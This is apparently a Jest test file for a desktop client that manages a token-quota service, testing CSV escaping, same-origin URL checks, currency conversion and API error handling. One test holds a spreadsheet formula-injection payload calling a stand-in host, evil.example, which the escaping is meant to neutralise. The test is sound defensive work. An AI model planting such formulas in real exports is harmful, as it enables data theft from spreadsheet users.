jest.mock("@/lib/tauri/commands", () => ({
  moreTokenCredentialState: jest.fn(),
  moreTokenForgetCredential: jest.fn(),
  moreTokenListInstances: jest.fn(),
  moreTokenManagementStepUpStart: jest.fn(),
  moreTokenManagementStepUpPoll: jest.fn(),
  moreTokenManagementStepUpCancel: jest.fn(),
  moreTokenPair: jest.fn(),
  moreTokenPersonalLogin: jest.fn(),
  moreTokenPersonalOAuthStart: jest.fn(),
  moreTokenPersonalOAuthPoll: jest.fn(),
  moreTokenPersonalOAuthCancel: jest.fn(),
  moreTokenRemoveInstance: jest.fn(),
  moreTokenRequest: jest.fn(),
  moreTokenSaveInstance: jest.fn(),
}))

import { moreTokenRequest } from "@/lib/tauri/commands"
import { createMemoryMoreTokenPort, setMoreTokenPortForTests } from "./port"
import {
  escapeCsvCell,
  ManagementApiError,
  managementRequest,
  listInstances,
  operationId,
  quotaCurrencyLabel,
  quotaDisplayAmount,
  sameOriginServerUrl,
} from "./client"

afterEach(() => setMoreTokenPortForTests(null))

it("supports an isolated in-memory adapter for browser tests", async () => {
  setMoreTokenPortForTests(
    createMemoryMoreTokenPort({
      listInstances: async () => [
        {
          id: "memory",
          name: "Memory",
          baseUrl: "https://memory.example",
          caFingerprint: null,
          readOnly: false,
          displayCurrency: "USD",
          package: "management",
        },
      ],
    })
  )
  await expect(listInstances()).resolves.toHaveLength(1)
})

it("blocks spreadsheet formulas in CSV exports", () => {
  expect(escapeCsvCell('=WEBSERVICE("https://evil.example")')).toBe(
    '"\'=WEBSERVICE(""https://evil.example"")"'
  )
  expect(escapeCsvCell("safe")).toBe("safe")
})

it("only opens same-origin absolute server paths", () => {
  expect(sameOriginServerUrl("https://more-token.example/base", "/console/topup")).toBe(
    "https://more-token.example/console/topup"
  )
  expect(() => sameOriginServerUrl("https://more-token.example", "//evil.example/path")).toThrow(
    "SERVER_URL_NOT_ALLOWED"
  )
  expect(() =>
    sameOriginServerUrl("https://more-token.example", "https://evil.example/path")
  ).toThrow("SERVER_URL_NOT_ALLOWED")
})

it("creates UUIDv7 operation identifiers", () => {
  const id = operationId()
  expect(id).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-7[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/)
})

it("converts raw quota into the configured display currency", () => {
  const display = {
    quota_per_unit: 500_000,
    display_currency: "USD",
    conversion_numerator: 7,
    conversion_denominator: 1,
    rate_valid_until: Math.floor(Date.now() / 1000) + 60,
    version: 1,
  }
  expect(quotaDisplayAmount(500_000, display)).toBe(7)
  expect(quotaDisplayAmount(38_000, display)).toBeCloseTo(0.532)
  expect(quotaCurrencyLabel(500_000, display)).toContain("7.00")
})

it("keeps small refunds visible instead of rounding them to negative zero", () => {
  const display = {
    quota_per_unit: 1_000,
    display_currency: "USD",
    conversion_numerator: 1,
    conversion_denominator: 1,
    rate_valid_until: Math.floor(Date.now() / 1000) + 60,
    version: 1,
  }
  const label = quotaCurrencyLabel(-4, display)
  expect(label).toMatch(/0[.,]004/)
  expect(label).not.toMatch(/-\D*0[.,]00(?!4)/)
})

it("refuses an expired monetary conversion and falls back to quota units", () => {
  const display = {
    quota_per_unit: 500_000,
    display_currency: "USD",
    conversion_numerator: 7,
    conversion_denominator: 1,
    rate_valid_until: 1,
    version: 1,
  }
  expect(quotaDisplayAmount(500_000, display)).toBeNull()
  expect(quotaCurrencyLabel(500_000, display)).toBe("500,000 quota")
})

it("unwraps a successful management envelope", async () => {
  ;(moreTokenRequest as jest.Mock).mockResolvedValue({
    status: 200,
    body: {
      success: true,
      data: {
        management_api_version: 2,
        minimum_desktop_version: "0.16.0",
        role: "admin",
        scopes: [],
        features: {
          management_api_enabled: true,
          personal_api_enabled: true,
          quota_transfer_enabled: true,
          quota_policy_automation_enabled: true,
          distribution_detail_enabled: true,
          step_up_required: true,
          account_invites_enabled: true,
          remote_revoke_enabled: true,
        },
        quota_display: {
          quota_per_unit: 500_000,
          display_currency: "USD",
          conversion_numerator: 1,
          conversion_denominator: 1,
          rate_valid_until: 0,
          version: 1,
        },
        quota_display_version: "2",
      },
      request_id: "req-1",
      server_time: 1,
    },
  })
  await expect(managementRequest("primary", { kind: "capabilities" })).resolves.toMatchObject({
    data: { role: "admin" },
    request_id: "req-1",
  })
})

it("rejects a success envelope whose operation data does not match the contract", async () => {
  ;(moreTokenRequest as jest.Mock).mockResolvedValue({
    status: 200,
    body: { success: true, data: { role: "admin" }, request_id: "req-invalid", server_time: 1 },
  })
  await expect(managementRequest("primary", { kind: "capabilities" })).rejects.toMatchObject({
    code: "INVALID_SERVER_RESPONSE",
  })
})

it("rejects malformed operations before they reach Tauri", async () => {
  ;(moreTokenRequest as jest.Mock).mockClear()
  await expect(
    managementRequest("primary", {
      kind: "quotaTransfer",
      body: { source_id: 1, target_id: 2, amount: -1 },
    } as never)
  ).rejects.toThrow("Invalid more-token operation")
  expect(moreTokenRequest).not.toHaveBeenCalled()
})

it("preserves structured server errors", async () => {
  ;(moreTokenRequest as jest.Mock).mockResolvedValue({
    status: 409,
    body: {
      success: false,
      error: {
        code: "VERSION_CONFLICT",
        message: "preview expired",
        request_id: "req-2",
        retryable: true,
      },
    },
  })
  await expect(managementRequest("primary", { kind: "capabilities" })).rejects.toEqual(
    expect.objectContaining<Partial<ManagementApiError>>({
      code: "VERSION_CONFLICT",
      requestId: "req-2",
      retryable: true,
    })
  )
})
